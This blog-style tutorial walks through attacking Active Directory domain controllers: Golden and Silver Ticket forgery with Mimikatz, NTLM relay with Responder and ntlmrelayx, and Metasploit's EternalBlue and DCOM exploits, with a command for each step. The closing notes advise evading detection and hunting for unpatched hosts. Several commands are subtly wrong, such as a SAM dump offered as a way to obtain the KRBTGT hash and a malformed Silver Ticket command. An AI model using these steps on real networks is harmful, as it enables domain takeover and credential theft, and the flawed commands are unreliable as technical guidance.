---
title: "Abusing Trusted Domain Controllers: From Privilege Escalation to Domain Domination"
published: 2025-04-20
description: "Exploiting misconfigurations and vulnerabilities in trusted Domain Controllers to escalate privileges and compromise the entire domain."
image: '1.jpeg'
tags: []
category: 'Privilege Escalation'
draft: false
lang: 'ar-eng'
---

# Table of Contents

- [Abusing Trusted Domain Controller](#abusing-trusted-domain-controller)
  - [Key Concepts](#key-concepts)
  - [Methods](#methods)
    - [1. Golden Ticket Attack](#1-golden-ticket-attack)
    - [2. Silver Ticket Attack](#2-silver-ticket-attack)
    - [3. NTLM Relay Attack](#3-ntlm-relay-attack)
    - [4. Exploiting SMB and DCOM Vulnerabilities](#4-exploiting-smb-and-dcom-vulnerabilities)
  - [Important Notes](#important-notes)


# Abusing Trusted Domain Controller

A **Domain Controller (DC)** is the server responsible for managing Active Directory (AD) in a network. The **DC** stores and manages user credentials, permissions, and access control for all machines and users in the domain. **Abusing Trusted DC** refers to exploiting vulnerabilities or misconfigurations in the DC to escalate privileges, gain unauthorized access, or control the entire domain.

## Key Concepts

- **Active Directory (AD)**: A directory service that stores information about network resources (users, computers, etc.) and provides authentication and authorization.
- **Domain Admin / Enterprise Admin**: Users with the highest privileges in AD, who can control all aspects of the domain.
- **Kerberos**: A network authentication protocol used by AD to securely authenticate users and services.
- **NTLM**: A legacy authentication protocol used in Windows environments for authentication.
- **Trust Relationships**: DCs in a domain trust each other for authentication purposes. Exploiting this trust can allow attackers to escalate privileges.

## Methods

### 1. Golden Ticket Attack

- **Step 1: Obtain KRBTGT Hash**
  - The **KRBTGT account** is responsible for signing Kerberos tickets in Active Directory.
  - To create a Golden Ticket, you need to dump the **KRBTGT hash** from a compromised machine with high privileges (e.g., Domain Admin).
  - **Tool**: **Mimikatz**
  - **Command**: `mimikatz.exe "lsadump::sam" /inject`
    - This will dump the hashes from the local SAM (Security Accounts Manager) database.

- **Step 2: Generate the Golden Ticket**
  - Once you have the **KRBTGT hash**, you can generate a **Golden Ticket** that will allow you to authenticate as any user (typically a Domain Admin).
  - **Tool**: **Mimikatz**
  - **Command**:
  
  ```powershell
  mimikatz.exe "kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /rc4:<KRBTGT_hash>"
  ```
  
  - This command generates a Golden Ticket that can be used to impersonate any user in the domain, including Domain Admins.

- **Step 3: Pass the Golden Ticket**
  - Now that the Golden Ticket is generated, you can use it to authenticate to any service in the domain (e.g., SMB, RDP, etc.).
  - **Tool**: **Mimikatz**
  - **Command**:
  
  ```powershell
  mimikatz.exe "kerberos::ptt /ticket:<path_to_ticket_file>"
  ```

### 2. Silver Ticket Attack

- **Step 1: Obtain Service Account Hash**
  - To create a Silver Ticket, you need to compromise a service account hash (e.g., for SMB, SQL Server).
  - **Tool**: **Mimikatz**
  - **Command**: `mimikatz.exe "lsadump::sam" /inject`
    - This command will dump the hashes of service accounts.

- **Step 2: Generate the Silver Ticket**
  - Once you have the service account hash, you can generate a **Silver Ticket** for a specific service.
  - **Tool**: **Mimikatz**
  - **Command**:
  
  ```powershell
  mimikatz.exe "kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /rc4:<service_account_hash> /rc4:<target_service_name>"
  ```

- **Step 3: Pass the Silver Ticket**
  - Use the Silver Ticket to authenticate to the target service (e.g., SMB, RDP).
  - **Tool**: **Mimikatz**
  - **Command**:
  
  ```powershell
  mimikatz.exe "kerberos::ptt /ticket:<path_to_ticket_file>"
  ```

### 3. NTLM Relay Attack

- **Step 1: Set Up the NTLM Relay Attack**
  - **Tool**: **Responder** or **NTLMRelayX**
  - **Command**:
  
  ```bash
  python3 Responder.py -I <interface> -rd
  ```
  
  - This will start the **Responder** tool to capture NTLM authentication requests.

- **Step 2: Relay the NTLM Authentication**
  - When a victim machine tries to authenticate using NTLM, Responder will capture the request and relay it to a DC or another machine in the network.
  - **Tool**: **Responder** or **NTLMRelayX**
  - **Command**:
  
  ```bash
  ntlmrelayx.py -tf targets.txt -smb2support
  ```
  
  - This will relay the captured NTLM hash to a DC or other target machine.

- **Step 3: Gain Access to DC**
  - If successful, you will authenticate as the victim user, gaining access to the DC or other services in the domain.

### 4. Exploiting SMB and DCOM Vulnerabilities

- **Step 1: Exploit SMB Vulnerabilities (EternalBlue)**
  - **Tool**: **Metasploit** or **EternalBlue**
  - **Command**:
  
  ```bash
  msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"
  ```
  
  - This will exploit the **EternalBlue** vulnerability in SMB to gain remote code execution on the DC.

- **Step 2: Exploit DCOM Vulnerabilities**
  - **Tool**: **Metasploit** or **DCOM Exploits**
  - **Command**:
  
  ```bash
  msfconsole -x "use exploit/windows/dcom/ms03_026_dcom"
  ```
  
  - This will exploit a vulnerability in **DCOM** to escalate privileges and potentially take control of the DC.

---

## Important Notes:

1. **KRBTGT Hash**: Always ensure you have access to a high-privileged account to dump the **KRBTGT hash**.
2. **Golden/Silver Tickets**: These tickets should be handled carefully and used only when necessary to avoid detection.
3. **NTLM Relay**: This attack is effective in environments where NTLM authentication is still used.
4. **Exploit SMB/DCOM**: Always check for unpatched systems that may be vulnerable to these types of attacks.

**`Happy Hacking Broo`**

---